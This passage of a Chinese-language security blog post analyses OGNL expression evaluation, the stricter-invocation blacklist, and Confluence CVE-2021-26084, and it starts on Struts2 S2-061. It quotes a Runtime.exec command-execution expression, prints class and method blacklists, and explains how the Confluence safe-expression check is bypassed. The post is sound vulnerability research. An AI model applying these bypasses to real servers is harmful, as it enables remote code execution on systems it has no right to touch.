+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getValueBody</span><span class="params">(OgnlContext context, Object source)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">    Object result = source;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 迭代处理字子节点的结果</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> ilast = <span class="keyword">this</span>._children.length - <span class="number">1</span>; i &lt;= ilast; ++i) &#123;</span><br><span class="line">        <span class="keyword">boolean</span> handled = <span class="keyword">false</span>;</span><br><span class="line">        ......</span><br><span class="line">        <span class="keyword">if</span> (!handled) &#123;</span><br><span class="line">            <span class="comment">// 调用子节点的getValue方法处理</span></span><br><span class="line">            result = <span class="keyword">this</span>._children[i].getValue(context, result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当Ognl计算<code>@java.lang.Runtime@getRuntime()</code>时，由于方法时静态方法会调用<code>ASTStaticMethod.getValueBody</code>。<code>ASTStaticMethod.getValueBody</code>通过<code>OgnlRuntime.callStaticMethod</code>处理方法的调用。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">getValueBody</span><span class="params">(OgnlContext context, Object source)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</span><br><span class="line">    Object[] args = OgnlRuntime.getObjectArrayPool().create(<span class="keyword">this</span>.jjtGetNumChildren());</span><br><span class="line">    Object root = context.getRoot();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> icount = args.length; i &lt; icount; ++i) &#123;</span><br><span class="line">            args[i] = <span class="keyword">this</span>._children[i].getValue(context, root);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Object var10 = OgnlRuntime.callStaticMethod(context, <span class="keyword">this</span>._className, <span class="keyword">this</span>._methodName, args);</span><br><span class="line">        <span class="keyword">return</span> var10;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        OgnlRuntime.getObjectArrayPool().recycle(args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>ObjectMethodAccessor</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectMethodAccessor</span> <span class="keyword">implements</span> <span class="title">MethodAccessor</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ObjectMethodAccessor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">callStaticMethod</span><span class="params">(Map context, Class targetClass, String methodName, Object[] args)</span> <span class="keyword">throws</span> MethodFailedException </span>&#123;</span><br><span class="line">        List methods = OgnlRuntime.getMethods(targetClass, methodName, <span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> OgnlRuntime.callAppropriateMethod((OgnlContext)context, targetClass, (Object)<span class="keyword">null</span>, methodName, (String)<span class="keyword">null</span>, methods, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">callMethod</span><span class="params">(Map context, Object target, String methodName, Object[] args)</span> <span class="keyword">throws</span> MethodFailedException </span>&#123;</span><br><span class="line">        Class targetClass = target == <span class="keyword">null</span> ? <span class="keyword">null</span> : target.getClass();</span><br><span class="line">        List methods = OgnlRuntime.getMethods(targetClass, methodName, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">if</span> (methods == <span class="keyword">null</span> || methods.size() == <span class="number">0</span>) &#123;</span><br><span class="line">            methods = OgnlRuntime.getMethods(targetClass, methodName, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> OgnlRuntime.callAppropriateMethod((OgnlContext)context, target, target, methodName, (String)<span class="keyword">null</span>, methods, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>OgnlRuntime.callAppropriateMethod()</code>处理方法调用，最终会调用<code>Method.invoke()</code>进行方法调用并返回值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">callAppropriateMethod</span><span class="params">(OgnlContext context, Object source, Object target, String methodName, String propertyName, List methods, Object[] args)</span> <span class="keyword">throws</span> MethodFailedException </span>&#123;</span><br><span class="line">    Throwable reason = <span class="keyword">null</span>;</span><br><span class="line">    Object[] actualArgs = _objectArrayPool.create(args.length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Method method = getAppropriateMethod(context, source, target, propertyName, methods, args, actualArgs);</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        ......</span><br><span class="line">            <span class="keyword">if</span> (target != <span class="keyword">null</span>) &#123;</span><br><span class="line">                className = target.getClass().getName() + <span class="string">"."</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> ilast = args.length - <span class="number">1</span>; i &lt;= ilast; ++i) &#123;</span><br><span class="line">                ......</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(className + methodName + <span class="string">"("</span> + buffer + <span class="string">")"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">        Object var26 = invokeMethod(target, method, convertedArgs);</span><br><span class="line">    <span class="keyword">return</span> var26;</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchMethodException var21) &#123;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeMethod</span><span class="params">(Object target, Method method, Object[] argsArray)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    Object result;</span><br><span class="line">    <span class="keyword">if</span> (syncInvoke) &#123;</span><br><span class="line">            ......</span><br><span class="line">            result = method.invoke(target, argsArray);</span><br><span class="line">            i......</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ......</span><br><span class="line">        result = method.invoke(target, argsArray);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>同样的，Ognl计算<code>exec(&quot;calc&quot;)</code>时，调用<code>ASTMethod.getValueBody</code>，最终也是在<code>OgnlRuntime.callAppropriateMethod()</code>中调用<code>Method.invoke()</code>处理。</p>
+<p><img src="/imgs/image-20211025153351367.png" alt="image-20211025153351367"></p>
+<h3 id="Ognl-3-2-18-测试"><a href="#Ognl-3-2-18-测试" class="headerlink" title="Ognl 3.2.18 测试"></a>Ognl 3.2.18 测试</h3><p>Ognl&gt;=3.1.25、Ognl&gt;=3.2.12配置了黑名单检测，会导致上面的实验失败，提示<code>cannot be called from within OGNL invokeMethod() under stricter invocation mode</code>，在使用StricterInvocation模式下不允许执行<code>java.lang.Runtime.getRuntime()</code>。</p>
+<p><img src="/imgs/image-20211025193041466.png" alt="image-20211025193041466"></p>
+<p>对比上面2.7.3版本，在<code>OgnlRuntime.invokeMethod</code>中，添加了黑名单判断，当命中黑名单会出现上图的报错：<code>ClassResolver</code>、<code>MethodAccessor</code>、<code>MemberAccess</code>、<code>OgnlContext</code>、<code>Runtime</code>、<code>ClassLoader</code>、<code>ProcessBuilder</code>等。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeMethod</span><span class="params">(Object target, Method method, Object[] argsArray)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (_useStricterInvocation) &#123;</span><br><span class="line">        Class methodDeclaringClass = method.getDeclaringClass();</span><br><span class="line">        <span class="keyword">if</span> (AO_SETACCESSIBLE_REF != <span class="keyword">null</span> &amp;&amp; AO_SETACCESSIBLE_REF.equals(method) || AO_SETACCESSIBLE_ARR_REF != <span class="keyword">null</span> &amp;&amp; AO_SETACCESSIBLE_ARR_REF.equals(method) || SYS_EXIT_REF != <span class="keyword">null</span> &amp;&amp; SYS_EXIT_REF.equals(method) || SYS_CONSOLE_REF != <span class="keyword">null</span> &amp;&amp; SYS_CONSOLE_REF.equals(method) || AccessibleObjectHandler<span class="class">.<span class="keyword">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">methodDeclaringClass</span>) || <span class="title">ClassResolver</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">methodDeclaringClass</span>) || <span class="title">MethodAccessor</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">methodDeclaringClass</span>) || <span class="title">MemberAccess</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">methodDeclaringClass</span>) || <span class="title">OgnlContext</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">methodDeclaringClass</span>) || <span class="title">Runtime</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">methodDeclaringClass</span>) || <span class="title">ClassLoader</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">methodDeclaringClass</span>) || <span class="title">ProcessBuilder</span>.<span class="title">class</span>.<span class="title">isAssignableFrom</span>(<span class="title">methodDeclaringClass</span>) || <span class="title">AccessibleObjectHandlerJDK9Plus</span>.<span class="title">unsafeOrDescendant</span>(<span class="title">methodDeclaringClass</span>)) </span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessException(<span class="string">"Method ["</span> + method + <span class="string">"] cannot be called from within OGNL invokeMethod() "</span> + <span class="string">"under stricter invocation mode."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">        result = invokeMethodInsideSandbox(target, method, argsArray);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-近期三个漏洞的分析"><a href="#0x05-近期三个漏洞的分析" class="headerlink" title="0x05 近期三个漏洞的分析"></a>0x05 近期三个漏洞的分析</h2><p>在CVE搜索<code>OGNL</code>，前三个漏洞分别是Confluence的CVE-2021-26084、Struts2的CVE-2020-17530和Apache Unomi的CVE-2020-13942，本次对这三个漏洞进行分析。</p>
+<p><img src="/imgs/image-20211020192633280.png" alt="image-20211020192633280"></p>
+<h3 id="Confluence-CVE-2021-26084"><a href="#Confluence-CVE-2021-26084" class="headerlink" title="Confluence CVE-2021-26084"></a>Confluence CVE-2021-26084</h3><h4 id="velocity模板引擎语法："><a href="#velocity模板引擎语法：" class="headerlink" title="velocity模板引擎语法："></a>velocity模板引擎语法：</h4><p>1、基本符号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;#&quot;标识velocity的脚本语句</span><br><span class="line">&quot;$&quot;获取一个对象或变量</span><br><span class="line">&quot;&#123;&#125;&quot;用来标识velocity变量</span><br><span class="line">&quot;!&quot;对变量为null的情况在页面显示为空白字符串</span><br><span class="line">用双引号还是单引号表示，默认“双引号，可以在stringliterals.interpolate&#x3D;false改变默认处理方式</span><br></pre></td></tr></table></figure>
+
+<p>2、示例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">## 1、变量引用</span><br><span class="line">$name</span><br><span class="line">## 2、语句&#x2F;指令-变量赋值</span><br><span class="line">#($name&#x3D;&quot;test&quot;)</span><br><span class="line">#set($value&#x3D; 123)</span><br><span class="line">## 3、#include和#parse的作用都是引入本地文件。#include引入的文件内容不会被velocity模板引擎解析。#parse引入的文件内容，将解析其中的velocity并交给模板，相当于把引入的文件内容copy到文件中。</span><br><span class="line">#parse ( &quot;&#x2F;template&#x2F;includes&#x2F;actionerrors.vm&quot; )</span><br><span class="line">#include ( &quot;&#x2F;template&#x2F;includes&#x2F;actionerrors.vm&quot; )</span><br></pre></td></tr></table></figure>
+
+<p>更多语法可参考：<a href="http://velocity.apache.org/engine/1.7/user-guide.html" target="_blank" rel="noopener">http://velocity.apache.org/engine/1.7/user-guide.html</a></p>
+<h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>confluence处理velocity模板，将velocity语法转为字符串输出到页面，其中涉及到的一些表达式计算会调用<code>ognl.getValue()</code>处理。confluence处理vm文件，首先将vm内容转为AST语法树，然后分别处理每一个节点的内容，将每个节点的内容拼接输出。</p>
+<p>Confluence的Velocity模板引擎处理vm文件流程主要在<code>com.opensymphony.webwork.dispatcher.VelocityResult.doExecute()</code>，首先获取OgnlValueStack、context上下文、getTemplate获取vm文件，接下来用<code>merge</code>处理合并页面结果，将结果输出给writer。</p>
+<p><img src="/imgs/image-20211102092238828.png" alt="image-20211102092238828"></p>
+<p>merge调用<code>((SimpleNode)this.data).render(ica, writer);</code>方法处理，先将vm文件的内容转为AST语法树，便于计算每个节点的结果。</p>
+<p><img src="/imgs/image-20211029164937856.png" alt="image-20211029164937856"></p>
+<p>本次漏洞涉及的<code>createpage-entervariables.vm</code>文件经过解析后的AST语法树如下图，每一个ASTXXX处理程序都继承自SimpleNode.</p>
+<p><img src="/imgs/image-20211029172804509.png" alt="image-20211029172804509"></p>
+<p>queryString在第7个节点，归属applyDecorator指令，程序处理时将applyDecorator又分为35个节点，queryString在<code>[#tag], [ ], [(], [&quot;Hidden&quot;], [ ], [&quot;name=&#39;queryString&#39;&quot;], [ ], [&quot;value=&#39;$!queryString&#39;&quot;], [)]</code>节点中处理，我们重点看这个处理过程。</p>
+<p><img src="/imgs/image-20211101105528345.png" alt="image-20211101105528345"></p>
+<p><code>[#tag], [ ], [(], [&quot;Hidden&quot;], [ ], [&quot;name=&#39;queryString&#39;&quot;], [ ], [&quot;value=&#39;$!queryString&#39;&quot;], [)]</code>节点属于AbstractTagDirective，会调用<code>AbstractTagDirective.render()</code>。</p>
+<p><img src="/imgs/image-20211101105925308.png" alt="image-20211101105925308"></p>
+<p><code>AbstractTagDirective.render()</code>首先调用<code>applyAttributes(contextAdapter, node, object)</code>处理参数，其中<code>AbstractTagDirective.createPropertyMap()</code>创建参数Map，保存property键值对。</p>
+<p><img src="/imgs/image-20211101131402876.png" alt="image-20211101131402876"></p>
+<p><img src="/imgs/image-20211101110706205.png" alt="image-20211101110706205"></p>
+<p>保存后<code>AbstractTagDirective.render()</code>调用<code>AbstractTagDirective.processTag()</code>处理tag</p>
+<p><img src="/imgs/image-20211102093809308.png" alt="image-20211102093809308"></p>
+<p>通过<code>AbstractTagDirective.processTag()</code>最终会调用<code>AbstractUITag.doEndTag()</code>，doEndTag调用<code>evaluateParams()</code>处理参数。</p>
+<p><img src="/imgs/image-20211101170016049.png" alt="image-20211101170016049"></p>
+<p><code>AbstractUITag.evaluateParams</code>通过<code>addParameter()</code>添加name和value，value的值通过<code>findValue()</code>获取具体的值。</p>
+<p><img src="/imgs/image-20211101170622663.png" alt="image-20211101170622663"></p>
+<p>调用<code>getValueFinder().findValue(expr, toType)</code>时会先调用<code>SafeExpressionUtil.isSafeExpression()</code>进行安全检查，而<code>isSafeExpression()</code>会通过<code>containsUnsafeExpression()</code>处理，这正是本次漏洞的关键之处。</p>
+<p><img src="/imgs/image-20211101153540964.png" alt="image-20211101153540964"></p>
+<p><code>containsUnsafeExpression()</code>代码如下，递归检查节点及其子节点是否包含黑名单。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">containsUnsafeExpression</span><span class="params">(Node node)</span> </span>&#123;</span><br><span class="line">    String nodeClassName = node.getClass().getName();</span><br><span class="line">    <span class="keyword">if</span> (UNSAFE_NODE_TYPES.contains(nodeClassName)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"ognl.ASTProperty"</span>.equals(nodeClassName) &amp;&amp; UNSAFE_PROPERTY_NAMES.contains(node.toString())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"ognl.ASTMethod"</span>.equals(nodeClassName) &amp;&amp; UNSAFE_METHOD_NAMES.contains(node.toString())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"ognl.ASTVarRef"</span>.equals(nodeClassName) &amp;&amp; UNSAFE_VARIABLE_NAMES.contains(node.toString())) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; node.jjtGetNumChildren(); ++i) &#123;</span><br><span class="line">            Node childNode = node.jjtGetChild(i);</span><br><span class="line">            <span class="keyword">if</span> (childNode != <span class="keyword">null</span> &amp;&amp; containsUnsafeExpression(childNode)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>黑名单包括静态方法、静态属性、构造方法、class、classLocader、getClass()、getClassLoader()、_memberAccess、context、request等。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    Set set = <span class="keyword">new</span> HashSet();</span><br><span class="line">    set.add(<span class="string">"ognl.ASTStaticMethod"</span>);</span><br><span class="line">    set.add(<span class="string">"ognl.ASTStaticField"</span>);</span><br><span class="line">    set.add(<span class="string">"ognl.ASTCtor"</span>);</span><br><span class="line">    set.add(<span class="string">"ognl.ASTAssign"</span>);</span><br><span class="line">    UNSAFE_NODE_TYPES = Collections.unmodifiableSet(set);</span><br><span class="line">    set = <span class="keyword">new</span> HashSet();</span><br><span class="line">    set.add(<span class="string">"class"</span>);</span><br><span class="line">    set.add(<span class="string">"classLoader"</span>);</span><br><span class="line">    UNSAFE_PROPERTY_NAMES = Collections.unmodifiableSet(set);</span><br><span class="line">    set = <span class="keyword">new</span> HashSet();</span><br><span class="line">    set.add(<span class="string">"getClass()"</span>);</span><br><span class="line">    set.add(<span class="string">"getClassLoader()"</span>);</span><br><span class="line">    UNSAFE_METHOD_NAMES = Collections.unmodifiableSet(set);</span><br><span class="line">    set = <span class="keyword">new</span> HashSet();</span><br><span class="line">    set.add(<span class="string">"#_memberAccess"</span>);</span><br><span class="line">    set.add(<span class="string">"#context"</span>);</span><br><span class="line">    set.add(<span class="string">"#request"</span>);</span><br><span class="line">    set.add(<span class="string">"#parameters"</span>);</span><br><span class="line">    set.add(<span class="string">"#session"</span>);</span><br><span class="line">    set.add(<span class="string">"#application"</span>);</span><br><span class="line">    UNSAFE_VARIABLE_NAMES = Collections.unmodifiableSet(set);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>UNSAFE_PROPERTY_NAMES</code>有<code>class</code>和<code>classLoader</code>两个元素，不包含<code>[&quot;class&quot;]</code>，而<code>[&quot;class&quot;]</code>子节点<code>&quot;class&quot;</code>属于ASTConst不进行检查，因此可绕过，对于方法黑名单，ASTMethod仅禁止<code>getClass()</code>和<code>getClassLoader()</code>，<code>forName</code>、<code>getMethod</code>、<code>invoke</code>等不在禁止范围。</p>
+<p><img src="/imgs/image-20211101143729230.png" alt="image-20211101143729230"></p>
+<p>特别说明下，<strong>confluence 使用的ognl版本是2.6.5，属于较早版本，没有在invokeMethod中添加黑名单进行安全检查</strong>，因此payload在ognl中可以顺利执行。（可参考0x04-Ognl 3.2.18 测试）</p>
+<p><img src="/imgs/image-20211101145629151.png" alt="image-20211101145629151"></p>
+<p>另外，除了<code>queryString</code>，vm中还有两个看起来可利用的参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#tag (&quot;Hidden&quot; &quot;name&#x3D;&#39;queryString&#39;&quot; &quot;value&#x3D;&#39;$!queryString&#39;&quot;)</span><br><span class="line">#tag (&quot;Hidden&quot; &quot;name&#x3D;&#39;templateId&#39;&quot; &quot;value&#x3D;&#39;$pageTemplate.id&#39;&quot;)</span><br><span class="line">#tag (&quot;Hidden&quot; &quot;name&#x3D;&#39;linkCreation&#39;&quot; &quot;value&#x3D;&#39;$linkCreation&#39;&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>经过尝试<code>linkCreation</code>同样也可以利用，跟<code>queryString</code>一样的：</p>
+<p><img src="/imgs/image-20211102110327135.png" alt="image-20211102110327135"></p>
+<p>而<code>templateId</code>不能利用，因为该参数实际需要的是int，后面强制转换会报错。</p>
+<p><img src="/imgs/image-20211102111044355.png" alt="image-20211102111044355"></p>
+<h3 id="Struts2-CVE-2020-17530（S2-061）"><a href="#Struts2-CVE-2020-17530（S2-061）" class="headerlink" title="Struts2 CVE-2020-17530（S2-061）"></a>Struts2 CVE-2020-17530（S2-061）</h3><p>Struts2的ognl RCE漏洞主要是添加黑名单来修复和绕过黑名单。</p>
+<h4 id="Struts2防护机制"><a href="#Struts2防护机制" class="headerlink" title="Struts2防护机制"></a>Struts2防护机制</h4><p>如果需要绕过Struts2的历史ognl rce的修复，需要考虑三点：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struts-defult.xml的struts.excludedClasses和struts.excludedPackageNames部分</span><br><span class="line">com.opensymphony.xwork2.ognl.SecurityMemberAccess</span><br><span class="line">Ognl.OgnlRuntime.invokeMethod()中的黑名单</span><br></pre></td></tr></table></figure>
+
+<p>struts2在<code>struts-defult.xml</code>文件中加入了一些类和包作为黑名单：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- s2-061修复前的黑名单 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.excludedClasses"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">value</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.lang.Object,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.lang.Runtime,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.lang.System,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.lang.Class,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.lang.ClassLoader,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.lang.Shutdown,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.lang.ProcessBuilder,</span></span></span><br><span class="line"><span class="tag"><span class="string">                sun.misc.Unsafe,</span></span></span><br><span class="line"><span class="tag"><span class="string">                com.opensymphony.xwork2.ActionContext"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">constant</span> <span class="attr">name</span>=<span class="string">"struts.excludedPackageNames"</span></span></span><br><span class="line"><span class="tag">              <span class="attr">value</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">                ognl.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.io.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.net.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                java.nio.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                javax.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                freemarker.core.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                freemarker.template.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                freemarker.ext.jsp.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                freemarker.ext.rhino.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                sun.misc.,</span></span></span><br><span class="line"><span class="tag"><span class="string">                